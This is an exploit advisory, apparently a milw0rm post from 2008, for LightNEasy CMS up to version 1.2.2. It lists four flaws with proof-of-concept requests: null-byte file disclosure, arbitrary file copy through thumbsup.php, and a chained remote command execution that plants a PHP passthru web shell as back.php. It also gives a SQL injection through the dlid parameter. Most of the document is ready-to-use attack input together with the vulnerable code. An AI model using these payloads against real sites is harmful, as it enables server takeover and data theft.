@@ -1,0 +1,114 @@
+# Author:	__GiReX__
+# mySite:	girex.altervista.org
+# Date:		14/04/08
+
+# CMS:		LightNEasy SQLite / no database <= 1.2.2
+# Site:		lightneasy.org
+
+# Advisory:	Multiple Remote Vulnerabilities
+
+# Need:		magic_quotes_gpc = Off
+		magic_quotes_gpc = On / Off for SQL Injections
+
+######################################################################################
+
+# Bug 1: 	Remote File Disclosure
+# Affected:	SQLite / no database
+
+# Get the config.php into HTML (like a comment)
+# Note config.php not exists in SQLite version
+
+# PoC:		[host]/[path]/LightNEasy.php?page=config.php%00
+
+######################################################################################
+
+# Bug 2:	Arbitrary file copy and rename / Thumsup v1.12
+# Affected:	SQLite / no database
+
+# This vuln is present in this extern script by Gerd Tentler that is included by default
+# in LightNEasy
+
+# Vuln Code:	LightNEasy/thumbsup.php
+
+34.   if(isset($_REQUEST['image'])) $image = $_REQUEST['image'];
+37.   if(isset($_REQUEST['cache_dir'])) $cache_dir = $_REQUEST['cache_dir'];
+
+407.  if($image) {
+        if($fp = @fopen($image, 'rb')) {    <==
+          $size = filesize($image);	    <==  Unfortunally filesize does not accept remote files
+          $data = fread($fp, $size);        <==
+         fclose($fp);
+ 
+        $original = "$cache_dir/img_" . md5($image . $size);  <==
+       }
+        else $error = 'Could not open';
+414.  }
+
+451.  if(!file_exists($original)) {
+            if($fp = @fopen($original, 'wb')) {       <==
+              fwrite($fp, $data, strlen($data));      <==
+              fclose($fp);
+455.     }
+
+# Note config.php not exists in SQLite version
+
+# PoC:		[host]/[path]/LightNEasy/thumbsup.php?image=../data/config.php&cache_dir=config.txt%00
+
+# And then get file disclosure with:
+
+# PoC:		[host]/[path]/LightNEasy/config.txt
+
+######################################################################################
+
+# Bug 3:	Getting a Remote Command Execution
+# Affected:	SQLite / no database
+
+# First of all inject PHP Code into comments.dat from $_POST['newsid'] that is not sanizated
+
+# Vuln code:	LightNEasy/runtime.php
+
+32.    if($_POST['submit']=="sendcomment") {
+...
+42.    if(!$fp=fopen("data/comments.dat","a")) die ($langmessage[142]);
+43.	  fwrite($fp,$_POST['newsid']."|".encode($_POST['commentname'])."|".    <==
+44.       encode($_POST['commentemail'])."|".time()."|".encode(stripslashes($_POST['commentmessage']))."||");
+
+
+# PoC:	If admin has been created some news and page news exists (it can has a different name)
+	
+	POST [host]/[path]/LightNEasy.php?page=news
+	Content-Type: application/x-www-form-urlencoded
+
+	commentname=1&commentemail=1&commentmessage=1&secCode=[CAPTCHA CODE]
+	&submit=sendcomment&newsid=<?php passthru($_GET['cmd']); ?>/*
+
+
+# Then create a file back.php with the trick of Bug 2
+
+# PoC:		[host]/[path]/LightNEasy/thumbsup.php?image=../data/comments.dat&cache_dir=../back.php%00
+
+# Finally send remote commands to back.php
+
+# PoC:		[host]/[path]/back.php?cmd=ls
+
+######################################################################################
+
+# Bug 4:	Multiple Remote SQL Injections
+# Affected:	SQLite
+
+# Works with magic_quotes_gpc = On / Off
+
+
+# Vuln Code:	/LightNEasy/lightneasy.php
+
+237. 	if(isset($_GET['dlid'])) {
+	   $result=dbquery("SELECT * FROM downloads WHERE reg=".$_GET['dlid']);
+
+
+# PoC:		[host]/[path]/index.php?dlid=-1 OR 1
+
+# You can find others more SQL Injections by yourself
+
+######################################################################################
+
+# milw0rm.com [2008-04-15]
